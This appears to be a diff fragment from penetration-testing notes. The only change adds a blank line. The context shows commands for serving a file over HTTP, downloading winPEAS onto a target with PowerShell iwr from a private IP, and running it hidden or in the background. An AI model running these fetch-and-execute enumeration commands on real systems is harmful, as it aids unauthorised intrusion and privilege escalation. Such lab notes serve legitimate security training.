@@ -127,6 +127,7 @@ python3 -m http.server 80
 then on target download using
 
 iwr -uri http://192.168.45.230/winPEASx64.exe -Outfile winPEAS.exe
+          
 Start-Process -FilePath "winPEAS.exe" -RedirectStandardOutput "winlog.txt" -NoNewWindow -WindowStyle Hidden
 # CMD
 start /B cmd /C "winPEAS.exe > winPEAS.txt"
